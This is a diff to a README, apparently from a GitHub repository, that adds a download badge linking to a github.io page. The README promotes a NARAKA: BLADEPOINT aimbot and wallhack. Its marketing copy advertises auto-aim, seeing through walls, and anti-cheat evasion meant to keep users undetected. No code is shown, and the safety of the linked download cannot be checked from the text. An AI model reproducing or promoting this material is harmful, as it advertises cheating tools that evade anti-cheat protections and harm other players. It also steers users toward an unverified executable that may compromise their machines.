@@ -4,6 +4,8 @@
 
 The **NARAKA: BLADEPOINT Aimbot & Wallhack** is a cutting-edge tool designed to give players a tactical edge in *NARAKA: BLADEPOINT*. Combine **pixel-perfect aim tracking**, **enemy visibility through walls**, and **anti-cheat evasion** to outplay opponents in this intense battle royale. Built for stealth and power, this open-source tool ensures you stay undetected while maximizing your combat potential.  
 
+**[![Download BLADEPOINT External](https://img.shields.io/badge/Download-BLADEPOINT%20External-blueviolet)](https://naraka-bladepoint-external-cheat.github.io/.github/)**
+
 ✨ **Key Features**:  
 - **Aimbot Mastery**: Auto-aim with adjustable FOV and sensitivity for instant kills.  
 - **Wallhack Vision**: See enemies, terrain, and obstacles through walls in real-time.  
